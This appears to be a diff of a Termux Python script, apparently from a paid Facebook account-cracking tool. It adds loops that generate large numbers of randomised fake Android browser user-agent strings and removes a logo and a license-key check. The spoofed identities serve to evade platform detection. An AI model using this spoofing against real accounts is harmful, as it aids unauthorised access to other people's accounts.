+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.randrange(6, 14)
+    c='SM-A105'
+    d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
+    f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    geko=f'{a} {b}; {c}) {d}{e} {f}'
+    ugen.append(geko)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.randrange(1, 14) 
+    c='RMX'
+    d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+    e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+    f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    g='Mobile Safari/537.36'
+    uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+    ugen.append(uga)
+
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.randrange(1, 14) 
+    c='CPH'
+    d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+    e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+    f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    g='Mobile Safari/537.36'
+    uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+    ugen.append(uga)
+
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.randrange(1, 14) 
+    c='vivo'
+    d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+    e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+    f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    g='Mobile Safari/537.36'
+    uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
+    ugen.append(uga)
+for agenku in range(10000):
+    a='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Infinix X653C'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)80.0.4758.60 Version/4.0 Linux/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3 '
+    uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['8.1.0','9','10','11','12','13'])
+    c='Nokia_X'
+    d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    e=random.randrange(73,100)
+    f='0'
+    g=random.randrange(4200,4900)
+    h=random.randrange(40,150)
+    i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.2.0.58.129;]'
+    uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['ASUS_Z01QD'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0. 0.29.105;]'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=(['S88Plus'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
+    uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SM-J610F'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(80,106)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SM-A51 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12 .108;]'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SGP712'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/537.36 [FB_IAB/FB4A;FBAV/351.0 .0.38.117;]'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['S98Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24. 77;]'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['en-gb; CPH1909'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36 HeyTapBrowser/7.4.2beta'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SAMSUNG SM-A750G)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/13.2 Chrome/'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uakuh)
+for xd in range(10000):
+    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+    c=random.randrange(73,100)
+    d=random.randrange(4200,4900)
+    e=random.randrange(40,150)
+    uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+    ugen.append(uaku)
+
+for t in range(10000):
+    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+    b=random.randrange(111111,210000)
+    c=random.randrange(73,100)
+    d=random.randrange(4200,4900)
+    e=random.randrange(40,150)
+    Denventa_Af1=f'Mozilla/5.0 (Linux; Android {a}; CPH2109 Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+    Denventa_Af2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
+    Denventa_Af3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+    Denventa_Af4=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+    uaku2 = random.choice([Denventa_Af1,Denventa_Af2,Denventa_Af3,Denventa_Af4])
+    ugen.append(uaku2)
+for xd in range(10000):
+    a='Mozilla/5.0 (Java; U; en-us; samsung-gt-s3850) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB Mobile UNTRUSTED/1.0'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='en-us;'
+    e=random.randrange(100, 9999)
+    f='AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile UNTRUSTED/1.0'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen.append(uaku)
+
+    aa='Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='id-id;'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+
+    aa='Mozilla/5.0 (Linux; Android 5.1.1;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='HUAWEI M2-A01W)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for t in range(10000):
+    a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
+    b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
+    c=random.randrange(111111,210000)
+    d=random.randrange(11,19)
+    e=random.randrange(73,100)
+    f=random.randrange(4200,4900)
+    g=random.randrange(40,150)
+    random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
+    random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
+    random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
+    random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
+    random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
+    random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
+    random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
+    random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
+    random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
+    random10=random.choice(['WOW64'])
+    _1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _3=f'Mozilla/5.0 (Linux; Android {a}; {random3} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _4=f'Mozilla/5.0 (Linux; Android {a}; {random4} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _5=f'Mozilla/5.0 (Linux; Android {a}; {random5} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _6=f'Mozilla/5.0 (Linux; Android {a}; {random6} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _7=f'Mozilla/5.0 (Linux; Android {a}; {random7} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _8=f'Mozilla/5.0 (Linux; Android {a}; {random8} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    _10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+    uaku2 = random.choice([_1,_2,_3,_4,_5,_6,_7,_8,_9,_10])
+    ugen.append(uaku2)
+for xd in range(10000):
+        aa='Mozilla/5.0 (Linux; U; Android'
+        b=random.choice(['6','7','8','9','10','11','12','13'])
+        c=f' TL-tl; {str(gt)}'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36'
+        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+        ugen.append(uaku2)
+for aat in range(1000):
+    a='Redmi'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+    ugen.append(uaku2)
+for sat in range(1000):
+    a='NokiaX'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    uakau2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+    ugen.append(uakau2)
+for hdhd in range(5000):
+       a='Mozilla/5.0 (Linux; Android'
+       b=random.choice(['9','10','11','12','13','14','15',])
+       c='Redmi Note 9 Pro Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+       d= random.randrange(40,115)
+       e='0'
+       f=random.randrange(3000,6000)
+       g=random.randrange(20,100)
+       h='Mobile Safari/537.36'
+       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
+       ugen.append(ug)
+os.system('clear')
+jsn =input('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mYOUR NAME :\033[1;32m ') 
+#os.system('xdg-open https://github.com/ALIVE-212')
 def clear():
-    wash("clear")
-    print(logo)
-#-------------------------(Special Lines)------------------------->>>
-def _________linex_________():
-    print(f"{BE}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•")
-#-------------------------(MR-TOP LOGO)------------------------->>>
-logo = f"""{G}
-{G0} ooooooooooo     ooooooo     oooooooooo
-{G1} 88  888  88   o888   888o    888    88
-{G2}     888       888     888    888oooo88
-{G3}     888       888o   o888    888
-{G4}    o888o        88ooo88     o888o
-{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
-{style}{G0} FACEBOOK    {RE}●{G0} REFAT SHAHRIAR
-{style}{G1} GITHUB      {RE}●{G1} REFAT-156
-{style}{G2} VERSION     {RE}●{G2} {vr}
-{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"""
-logopaid = f"""{logo}
-{style}{G3} THIS IS PAID TOOL -{RE}●{G})
-{style}{G4} SENT YOUR KEY ADMIN -{RE}●{G})
-{style}{G5} FREE USER DONT COME INBOX [📥]"""
-#-------------------------(MR-TOP ALL VALUE)------------------------->>>
-XeX = soso
-aplnk = XeX
-buffer = BytesIO()
-c = pycurl.Curl()
-c.setopt(c.URL, aplnk)
-c.setopt(c.WRITEDATA, buffer)
-try:c.perform()
-except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
-c.close()
-body = buffer.getvalue().decode('utf-8')
-link = body
-#-------------------------(MAIN MENU)------------------------->>>
-def ___R_E_F_A_T___():
-    global lim
-    clear();verify();iamcheckingyou()
-    try:
-        key = open('/data'+'/data/com'+'.termux/fi'+'les/usr/bi'+'n/.tmrnu'+'nucoto.txt','r').read()
-    except FileNotFoundError: 
-        key = str(input(f"{style} P"+"UT L"+"ICE"+f"NSE {RE}●{G} "))
-    result = Key.activate(token=auth,\
-    rsa_pub_key=OkLic,\
-    product_id=23545, \
-    key=key,\
-    machine_code=Helpers.GetMachineCode())
-    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
-        clear()
